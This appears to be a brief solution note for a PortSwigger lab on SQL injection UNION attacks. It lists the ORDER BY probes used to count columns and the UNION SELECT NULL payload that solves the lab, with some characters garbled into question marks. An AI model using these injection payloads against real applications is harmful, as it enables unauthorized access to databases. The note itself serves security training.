--Name: SQL injection UNION attack, determining the number of columns returned by the query
--URL:https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
--Level:Medium Time: 5 min
---------------------------------------------------------------------------------
SELECT * FROM products WHERE category = 'Gifts' ????
SELECT * FROM products WHERE category = 'Gifts' Order By 1-- ????        OK
SELECT * FROM products WHERE category = 'Gifts' Order By 2-- ????        OK
SELECT * FROM products WHERE category = 'Gifts' Order By 3-- ????        OK
SELECT * FROM products WHERE category = 'Gifts' Order By 4-- ????        Error

SELECT ?,?,? From products WHERE category = 'Gifts' UNION SELECT NULL, NULL, NULL-- ???         Solved